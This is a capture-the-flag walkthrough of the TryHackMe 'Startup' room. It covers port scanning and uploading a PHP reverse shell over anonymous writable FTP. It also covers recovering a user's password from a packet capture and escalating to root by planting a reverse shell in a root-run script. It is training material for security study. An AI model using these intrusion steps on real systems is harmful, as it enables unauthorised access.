```bash
# PLATFORM          . THM
# CTF NAME          . Startup
# DESCRIPTION       . Abuse traditional vulnerabilities via untraditional means.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/startup
```

```bash
sudo nmap -sSVC -T5 10.10.28.224 -p- -oN Startup
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.11.53.46
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9a60b841d2201a401304843612bab94 (RSA)
|   256 ec13258c182036e6ce910e1626eba2be (ECDSA)
|_  256 a2ff2a7281aaa29f55a4dc9223e6b43f (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

- I also started fuzzing the webserver in the meanwhile.

```bash
ffuf -u http://10.10.28.224/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
```

```
files                   [Status: 301, Size: 312, Words: 20, Lines: 10]
```

- FTP supports anonymous login. However, both files are also present in the `/files` web directory, so we can grab them either way.

```notice.txt
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

- Alright. What I understand here is that this FTP was meant to be left public (anonymous). But we got an username: `maya`.

- A simple `binwalk -e` on the `important.jpg` will reveal that it has a chunk `zlib compressed data` inside it. 

- I don't have any idea if there's a tool that could help me with that and I've called my best friend, Python :) 

```python
import zlib

input_file = '39.zlib'
output_file = 'data.txt'

with open(input_file, 'rb') as compressed_file:
    compressed_data = compressed_file.read()

decompressed_data = zlib.decompress(compressed_data)

with open(output_file, 'wb') as output:
    output.write(decompressed_data)

print(f"Data written to {output_file}")
```

- But I encountered some ugly errors, and, from the research I've done, either the data is corrupted or I'm too dumb to make this work.

```
zlib.error: Error -3 while decompressing data: incorrect header check
```

- I started looking back the way I came from, thinking that maybe I've missed something. 

- I have noticed that we have `write access` to the `FTP` folder. Since we already know that everything there will end up on the webserver in `/files`, let's go ahead and try uploading a revshell.

```
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp

-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
```

```
cd ftp
250 Directory successfully changed.

ftp> put shell.php shell.php

local: shell.php remote: shell.php
200 EPRT command successful. Consider using EPSV.
150 Ok to send data.

226 Transfer complete.

ftp> exit
```

- The shell is available at `ip/files/ftp/shell.php`

- The first flag is in `/recipe.txt`.

- In the same directory, there's an uncommon directory called `incidents` with a file `suspiucious.pcapng`

- I've moved the file to `/var/www/html/files/ftp` and downloaded it on my machine.

- After some analysis, I've noticed that in the HTTP traffic there was a previous attempt to get a reverse shell on the server.

![[Pasted image 20231125214019.png]]

- The `shell.php` file could also be viewed from `File -> Export Objects -> HTTP`

- If we follow the TCP-Stream of those packets, we end up with packet 215 (tcp stream 7), where we can find the password of user `lennie

```bash
www-data@startup:/home$ cd lennie
bash: cd: lennie: Permission denied
www-data@startup:/home$ sudo -l
sudo -l
[sudo] password for www-data: c4ntg3t3n0ughsp1c3
```

- The first flag is in `/home/lennie/user.txt`.

- The privilege escalation was rather straight forward. Inside lennie's home directory, there is a directory called `scripts`.

- Inside that, we find a bash script called `planner.sh` that is owned by root.

```
lennie@startup:~/scripts$ ls -l .

-rwxr-xr-x 1 root root 77 Nov 12  2020 planner.sh
```

```planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

- However, the script called at the end, `print.sh`, is owned (thus editable) by lennie. 

- Edit the `/etc/print.sh` file with a `bash reverse shell` and start up a listener on the attack box. 

- The last flag is in `/root/root.txt`
